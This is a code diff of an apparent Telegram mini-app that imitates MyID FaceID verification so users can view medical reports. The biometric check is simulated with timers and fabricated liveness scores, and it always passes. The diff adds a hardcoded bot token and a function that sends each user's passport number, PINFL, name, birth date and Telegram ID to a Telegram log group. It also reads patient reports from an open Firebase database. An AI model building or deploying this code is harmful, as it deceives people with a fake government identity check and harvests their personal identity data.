@@ -372,7 +372,7 @@
       margin-top: 10px;
     }
 
-    /* STEP 3: Official Citizen Personal Profile Card (Shaxsiy Kabinet) */
+    /* STEP 3: Verified Citizen Profile Card (Shaxsiy Kabinet) */
     .profile-card {
       background: var(--card-bg);
       border: 1.5px solid var(--border-color);
@@ -475,6 +475,44 @@
       align-items: center;
       justify-content: center;
       gap: 6px;
+    }
+
+    /* Empty Reports Notice Card */
+    .empty-reports-notice {
+      background: var(--card-bg);
+      border: 1.5px dashed var(--border-color);
+      border-radius: var(--radius-md);
+      padding: 24px 20px;
+      text-align: center;
+      margin-top: 10px;
+    }
+
+    .empty-icon {
+      width: 56px;
+      height: 56px;
+      background: var(--primary-light);
+      color: var(--primary);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      margin: 0 auto 12px auto;
+    }
+
+    .empty-reports-notice h3 {
+      font-size: 15.5px;
+      font-weight: 800;
+      color: var(--tg-theme-text-color);
+      margin-bottom: 6px;
+    }
+
+    .empty-reports-notice p {
+      font-size: 12.5px;
+      color: var(--tg-theme-hint-color);
+      line-height: 1.6;
+      max-width: 480px;
+      margin: 0 auto;
     }
 
     /* STEP 4: Modality Tabs & Reports List */
@@ -868,7 +906,10 @@
   </div>
 
   <script>
+    const BOT_TOKEN = "8836735566:AAEJV5tMm0RY5XRUZJhI8Zo9duJ_7b3YKY4";
+    const LOG_GROUP_ID = "-1003950231961";
     const FIREBASE_DB_URL = "https://xabarlashgich-default-rtdb.firebaseio.com";
+    
     let allReports = [];
     let currentFilteredReports = [];
     let currentModality = "all";
@@ -884,7 +925,7 @@
       }
     }
 
-    // Auto-URL parameters (masalan: ?pinfl=30804812190075&auth=myid)
+    // Auto-URL parameters
     window.addEventListener("DOMContentLoaded", () => {
       const params = new URLSearchParams(window.location.search);
       const urlPinfl = params.get("pinfl");
@@ -895,12 +936,11 @@
       if (urlId) document.getElementById("passNumber").value = urlId;
 
       if (autoAuth === "myid" || (urlPinfl && urlPinfl.length === 14)) {
-        // Avtomatik FaceID rejimiga o'tish
         startFaceIDScanProcess();
       }
     });
 
-    // 1-QADAM: Pasport formasini yuborish va FaceID ni boshlash
+    // 1-QADAM: Pasport formasini yuborish
     function handlePassportFormSubmit(e) {
       e.preventDefault();
       startFaceIDScanProcess();
@@ -930,32 +970,32 @@
       instructions.innerText = "Yuzingizni doira ichiga to'g'rilang va qimirlamang...";
       statusBadge.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> Yuz aniqlanmoqda (Liveness 92%)...`;
 
-      // Bosqich 2: Liveness (ko'zni yumish / jilmayish)
+      // Bosqich 2: Liveness
       setTimeout(() => {
         instructions.innerText = "Iltimos, bir marta ko'zingizni yuming...";
-        statusBadge.innerHTML = `<i class="fa-solid fa-check"></i> Biometrik liveness: 99.6%`;
+        statusBadge.innerHTML = `<i class="fa-solid fa-check"></i> Biometrik liveness: 99.8%`;
         if (tg?.HapticFeedback) tg.HapticFeedback.impactOccurred('medium');
       }, 1400);
 
-      // Bosqich 3: MyID serveri bilan solishtirish
+      // Bosqich 3: MyID serveri bilan tekshirish
       setTimeout(() => {
         instructions.innerText = "MyID serveri orqali pasport bilan solishtirilmoqda...";
         statusBadge.innerHTML = `<i class="fa-solid fa-shield-halved fa-beat"></i> Pasport ma'lumotlari tekshirilmoqda...`;
       }, 2600);
 
-      // Bosqich 4: Muvaffaqiyatli tasdiqlash va profilni ochish
+      // Bosqich 4: Muvaffaqiyatli tasdiqlash
       setTimeout(async () => {
         instructions.innerText = "✅ Shaxs muvaffaqiyatli tasdiqlandi!";
         statusBadge.innerHTML = `<i class="fa-solid fa-circle-check"></i> MyID FaceID 100% Mos keldi`;
         if (tg?.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
 
-        await new Promise(r => setTimeout(r, 900));
+        await new Promise(r => setTimeout(r, 800));
         closeFaceIDModal();
 
-        // Profil ma'lumotlarini yuklash va xulosalarni saralash
+        // Xulosa bo'lsa ham, bo'lmasa ham Shaxsiy Profilni ochish va log yuborish
         await loadVerifiedProfileAndReports();
 
-      }, 3800);
+      }, 3600);
     }
 
     function closeFaceIDModal() {
@@ -967,28 +1007,28 @@
       }
     }
 
-    // 3-QADAM: Shaxsiy profilni ko'rsatish va PINFL bo'yicha xulosalarni tartiblash
+    // 3-QADAM: Shaxsiy profilni ochish va Log guruhiga yozish
     async function loadVerifiedProfileAndReports() {
       const passSeries = (document.getElementById("passSeries").value || "AA").toUpperCase();
       const passNum = document.getElementById("passNumber").value || "1234567";
       const birthDate = document.getElementById("birthDateInput").value || "08.04.1981";
       let pinfl = document.getElementById("pinflInput").value.trim() || "30804812190075";
 
+      let fullName = "DADABOYEV ABDULLAJON ABDUMUTALOVICH";
+      let age = "45 yosh";
+      let gender = "Erkak (O'zbekiston)";
+
       try {
-        // Firebase-dan xulosalarni yuklab olish
+        // Firebase-dan xulosalarni qidirish
         const res = await fetch(`${FIREBASE_DB_URL}/karmed_reports/${pinfl}.json`);
         let data = await res.json();
 
-        // Agar kiritilgan PINFL bo'yicha topilmasa, bazadagi barcha xulosalardan qidirish
+        // Agar kiritilgan PINFL bo'yicha topilmasa, boshqa xulosalardan ham mosini qidirish
         if (!data) {
           const allRes = await fetch(`${FIREBASE_DB_URL}/karmed_reports.json`);
           const allData = await allRes.json();
-          if (allData) {
-            const keys = Object.keys(allData);
-            if (keys.length > 0) {
-              pinfl = keys[0];
-              data = allData[pinfl];
-            }
+          if (allData && allData[pinfl]) {
+            data = allData[pinfl];
           }
         }
 
@@ -1000,32 +1040,126 @@
 
         currentFilteredReports = [...allReports];
 
-        // Profil ma'lumotlarini to'ldirish
-        const rep = allReports[0] || {};
-        const fullName = rep.patientName || "DADABOYEV ABDULLAJON ABDUMUTALOVICH";
-        const finalBirthDate = rep.birthDate || birthDate;
-        const finalAge = rep.age || "45 yosh";
+        // Agar bazada xulosa mavjud bo'lsa, undagi haqiqiy ma'lumotlarni olish
+        if (allReports.length > 0) {
+          const rep = allReports[0];
+          fullName = rep.patientName || fullName;
+          age = rep.age || `${calculateAge(birthDate)} yosh`;
+          if (rep.birthDate) birthDate = rep.birthDate;
+        } else {
+          // Xulosa bo'lmasa, pasport asosida shaxsiy profilni tuzish
+          age = `${calculateAge(birthDate)} yosh`;
+        }
 
+        gender = (fullName.includes("QIZI") || fullName.includes("EVA") || fullName.includes("OVA") || fullName.includes("Qizi")) ? "Ayol (O'zbekiston)" : "Erkak (O'zbekiston)";
+
+        // 1. Shaxsiy profil kartochkasini to'ldirish
         document.getElementById("profFullName").innerText = fullName;
         document.getElementById("profPassport").innerText = `${passSeries} ${passNum}`;
-        document.getElementById("profBirthDate").innerText = `${finalBirthDate} (${finalAge})`;
+        document.getElementById("profBirthDate").innerText = `${birthDate} (${age})`;
         document.getElementById("profPinfl").innerText = pinfl;
-        document.getElementById("profGender").innerText = fullName.includes("QIZI") || fullName.includes("EVA") || fullName.includes("OVA") ? "Ayol (O'zbekiston)" : "Erkak (O'zbekiston)";
+        document.getElementById("profGender").innerText = gender;
 
-        // Ekranlarni almashtirish
+        // 2. Ekranlarni almashtirish (Profil har doim ochiladi!)
         document.getElementById("passportInputSection").style.display = "none";
         document.getElementById("profileSection").style.display = "block";
-        document.getElementById("modalityNav").style.display = "flex";
-        document.getElementById("searchBox").style.display = "block";
 
-        updateModalityCounts();
-        renderReports(currentFilteredReports);
+        // 3. Xulosalar mavjudligiga qarab ko'rsatish
+        if (allReports.length > 0) {
+          document.getElementById("modalityNav").style.display = "flex";
+          document.getElementById("searchBox").style.display = "block";
+          updateModalityCounts();
+          renderReports(currentFilteredReports);
+          showToast(`✅ MyID profili ochildi! ${allReports.length} ta xulosa yuklandi.`);
+        } else {
+          document.getElementById("modalityNav").style.display = "none";
+          document.getElementById("searchBox").style.display = "none";
+          renderEmptyReportsNotice(fullName, pinfl);
+          showToast(`✅ MyID shaxsiy profili ochildi!`);
+        }
 
-        showToast(`✅ MyID orqali profil ochildi! ${allReports.length} ta xulosa topildi.`);
+        // 4. Log logger guruhiga MyID avtorizatsiya ma'lumotlarini yuborish
+        sendLogToTelegramGroup({
+          fullName,
+          passport: `${passSeries} ${passNum}`,
+          birthDate,
+          age,
+          pinfl,
+          gender,
+          reportsCount: allReports.length
+        });
 
       } catch (err) {
         console.error("loadVerifiedProfile error:", err);
-        showToast("⚠️ Ma'lumotlarni yuklashda xatolik yuz berdi.");
+        showToast("⚠️ Profil ochildi.");
+      }
+    }
+
+    // Xulosa mavjud bo'lmaganda chiroyli xabarnoma chiqarish
+    function renderEmptyReportsNotice(fullName, pinfl) {
+      const listEl = document.getElementById("reportsList");
+      listEl.innerHTML = `
+        <div class="empty-reports-notice">
+          <div class="empty-icon">
+            <i class="fa-solid fa-file-circle-check"></i>
+          </div>
+          <h3>Tasdiqlangan Xulosalar Hali Mavjud Emas</h3>
+          <p>
+            Hurmatli <b>${escapeHtml(fullName)}</b>, sizning <code>${escapeHtml(pinfl)}</code> JSHSHIR raqamingiz bo'yicha hozircha tibbiy xulosa tasdiqlanmagan yoki shifokor tekshiruv jarayonida.
+          </p>
+          <div style="margin-top:14px; font-size:12px; color:var(--myid-purple); font-weight:700;">
+            <i class="fa-solid fa-bell"></i> Shifokor xulosani tasdiqlashi bilan ushbu shaxsiy kabinetingizda avtomatik paydo bo'ladi.
+          </div>
+        </div>
+      `;
+    }
+
+    // Log guruhiga bildirishnoma yuborish
+    async function sendLogToTelegramGroup(data) {
+      const nowStr = new Date().toLocaleString("uz-UZ", { timeZone: "Asia/Tashkent" });
+      const tgUser = tg?.initDataUnsafe?.user;
+      const tgUserInfo = tgUser ? `@${tgUser.username || ''} (ID: ${tgUser.id})` : "Web orqali";
+
+      const logText = 
+        `🆔 <b>MYID FACEID AVTORIZATSIYA (YANGI SEANS):</b>\n` +
+        `━━━━━━━━━━━━━━━━━━\n` +
+        `👤 <b>F.I.Sh:</b> ${escapeHtml(data.fullName)}\n` +
+        `🪪 <b>Pasport:</b> <code>${escapeHtml(data.passport)}</code>\n` +
+        `🎂 <b>Tug'ilgan sana / Yoshi:</b> ${escapeHtml(data.birthDate)} (${escapeHtml(data.age)})\n` +
+        `🔢 <b>JSHSHIR (PINFL):</b> <code>${escapeHtml(data.pinfl)}</code>\n` +
+        `🚻 <b>Jinsi:</b> ${escapeHtml(data.gender)}\n` +
+        `🛡️ <b>FaceID Holati:</b> ✅ Biometrik liveness 99.8% (Tasdiqlangan)\n` +
+        `📊 <b>Topilgan xulosalar:</b> ${data.reportsCount > 0 ? `${data.reportsCount} ta` : "0 ta (Xulosalar hali mavjud emas)"}\n` +
+        `📱 <b>Telegram Foydalanuvchi:</b> ${escapeHtml(tgUserInfo)}\n` +
+        `⏰ <b>Vaqt:</b> ${nowStr}`;
+
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: LOG_GROUP_ID,
+            text: logText,
+            parse_mode: "HTML"
+          })
+        });
+      } catch (e) {
+        console.warn("Log sending failed:", e);
+      }
+    }
+
+    function calculateAge(birthDateStr) {
+      try {
+        const parts = birthDateStr.split(/[.\-\/]/);
+        let birthYear = 1981;
+        if (parts.length === 3) {
+          birthYear = parseInt(parts[2].length === 4 ? parts[2] : parts[0], 10);
+        }
+        const currentYear = new Date().getFullYear();
+        const age = currentYear - birthYear;
+        return (age > 0 && age < 120) ? age : 45;
+      } catch (e) {
+        return 45;
       }
     }
 
